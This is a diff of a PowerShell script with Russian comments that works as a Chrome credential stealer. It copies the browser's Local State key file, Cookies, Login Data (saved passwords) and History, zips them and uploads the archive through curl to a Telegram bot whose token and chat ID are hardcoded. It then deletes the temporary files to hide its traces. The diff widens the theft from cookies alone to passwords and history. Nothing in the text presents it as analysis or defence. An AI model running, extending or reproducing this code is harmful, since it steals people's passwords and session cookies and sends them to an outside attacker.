@@ -1,34 +1,35 @@
 $token = "8680192798:AAFdHwzr2HYwbGjz3gkaS5xlYjryAozMkGI"
 $chatId = "1940923712"
 
-# Пути к файлам
 $userData = "$env:LOCALAPPDATA\Google\Chrome\User Data"
 $localState = "$userData\Local State"
+# Пути к разным базам данных
 $cookies = "$userData\Default\Network\Cookies"
+$passwords = "$userData\Default\Login Data"
+$history = "$userData\Default\History"
 
-# Куда копируем
 $destDir = "$env:TEMP\collect"
 New-Item -ItemType Directory -Path $destDir -Force | Out-Null
 
 try {
-    # 1. Забираем Local State (там зашифрованный ключ)
+    # Собираем всё в одну папку
     Copy-Item $localState -Destination "$destDir\ls.json" -Force
-    
-    # 2. Забираем Cookies (база данных)
-    # Если браузер открыт, обычное копирование может не сработать, используем 'Force'
-    Copy-Item $cookies -Destination "$destDir\c.db" -Force
+    if (Test-Path $cookies) { Copy-Item $cookies -Destination "$destDir\cookies.db" -Force }
+    if (Test-Path $passwords) { Copy-Item $passwords -Destination "$destDir\passwords.db" -Force }
+    if (Test-Path $history) { Copy-Item $history -Destination "$destDir\history.db" -Force }
 
-    # 3. Архивируем и отправляем (используем встроенный в Windows Compress-Archive)
-    $zipFile = "$env:TEMP\data.zip"
+    # Архивируем
+    $zipFile = "$env:TEMP\vault.zip"
     Compress-Archive -Path "$destDir\*" -DestinationPath $zipFile -Force
     
+    # Отправляем
     & curl.exe -s -X POST "https://api.telegram.org/bot$token/sendDocument" -F "chat_id=$chatId" -F "document=@$zipFile"
     
-    # Чистим за собой
+    # Очистка
     Remove-Item $destDir -Recurse -Force
     Remove-Item $zipFile -Force
     
-    Write-Host "Success! Archive sent."
+    Write-Host "Vault sent!"
 } catch {
-    & curl.exe -s -X POST "https://api.telegram.org/bot$token/sendMessage" -d "chat_id=$chatId" -d "text=Error collecting files"
+    & curl.exe -s -X POST "https://api.telegram.org/bot$token/sendMessage" -d "chat_id=$chatId" -d "text=Collection failed"
 }
